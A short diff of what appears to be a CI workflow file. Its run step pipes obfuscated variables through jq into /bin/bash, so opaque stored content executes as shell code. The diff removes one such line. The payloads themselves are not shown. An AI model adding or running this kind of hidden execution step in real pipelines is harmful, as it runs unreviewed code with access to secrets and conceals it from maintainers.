@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$r73964" | jq -r .iifqc10972 | /bin/bash
           printf '%s' "$qa8343" | jq -r .tx864 | /bin/bash
-          echo $av3 | jq -r .h722 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
